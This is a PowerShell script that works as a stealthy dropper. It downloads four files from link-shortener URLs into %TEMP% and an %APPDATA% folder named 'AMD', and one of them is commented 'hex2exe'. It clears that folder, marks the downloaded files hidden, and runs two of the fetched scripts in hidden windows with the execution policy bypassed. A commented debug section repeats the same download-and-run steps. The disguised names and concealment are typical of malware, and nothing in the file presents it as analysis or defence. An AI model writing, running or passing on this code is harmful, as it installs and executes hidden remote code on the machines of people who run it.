# Define the URLs of the files to download
$url1 = "https://lnkfwd.com/u/KtRiC0kh"
$url2 = "https://lnkfwd.com/u/Kqc2ajEr"
$url3 = "https://lnkfwd.com/u/K-060JPj" #RAMMAP hex2exe
$url4 = 'https://lnkfwd.com/u/K-2Pq1DI' #RAMMap.txt

# Define the destination paths in the %TEMP% directory
$destination1 = "$env:TEMP\ftf.ps1"
$destination2 = "$env:TEMP\Ain1.ps1"
$destination3 = "$env:APPDATA\AMD\ConvertNrun.ps1" # Change "yourfile.ps1" to your desired filename
$destination4 = "$env:APPDATA\AMD\RAMMap.txt"

# Create the AMD directory if it doesn't exist
$amdDirectory = "$env:APPDATA\AMD"

# Check if the AMD directory exists
if (Test-Path -Path $amdDirectory) {
    # If the directory exists, delete all files in it
    Get-ChildItem -Path $amdDirectory -File | Remove-Item -Force
} else {
    # If the directory doesn't exist, create it
    New-Item -ItemType Directory -Path $amdDirectory
}

# Check if ConvertNrun.ps1 and RAMMap.txt already exist, and remove them if they do
if (Test-Path -Path $destination3) {
    Remove-Item -Path $destination3 -Force
}
if (Test-Path -Path $destination4) {
    Remove-Item -Path $destination4 -Force
}

Invoke-WebRequest -Uri $url1 -OutFile $destination1
Invoke-WebRequest -Uri $url2 -OutFile $destination2
Invoke-WebRequest -Uri $url3 -OutFile $destination3
Invoke-WebRequest -Uri $url4 -OutFile $destination4


# Set the downloaded files in C:\AMD as hidden
$filesToHide = @($destination3, $destination4)

foreach ($file in $filesToHide) {
    if (Test-Path -Path $file) {
        # Set the file attribute to Hidden
        $filePath = Join-Path -Path $amdDirectory -ChildPath (Split-Path -Path $file -Leaf)
        if (Test-Path -Path $filePath) {
            Set-ItemProperty -Path $filePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
        }
    }
}


# Run the first script (ftf.ps1) from the %TEMP% directory
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\ftf.ps1`"" -Wait

# Run the second script (Ain1.ps1) from the %TEMP% directory after the first finishes
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\Ain1.ps1`""




# #debug
# # Use Invoke-WebRequest to download the first file with error handling
# try {
#     Invoke-WebRequest -Uri $url1 -OutFile $destination1 -ErrorAction Stop
#     # Output the path to confirm where the first file was saved
#     # Write-Output "First file downloaded to: $destination1"
# } catch {
#     # Write-Output "Error: Unable to download file from $url1"
# }

# # Use Invoke-WebRequest to download the second file with error handling
# try {
#     Invoke-WebRequest -Uri $url2 -OutFile $destination2 -ErrorAction Stop
#     # Output the path to confirm where the second file was saved
#     # Write-Output "Second file downloaded to: $destination2"
# } catch {
#     # Write-Output "Error: Unable to download file from $url2"
# }

# ######## launch the first

# # Run the first script (ftf.ps1) from the %TEMP% directory
# Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\ftf.ps1`"" -Wait

# # Run the second script (Ain1.ps1) from the %TEMP% directory after the first finishes
# Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\Ain1.ps1`""
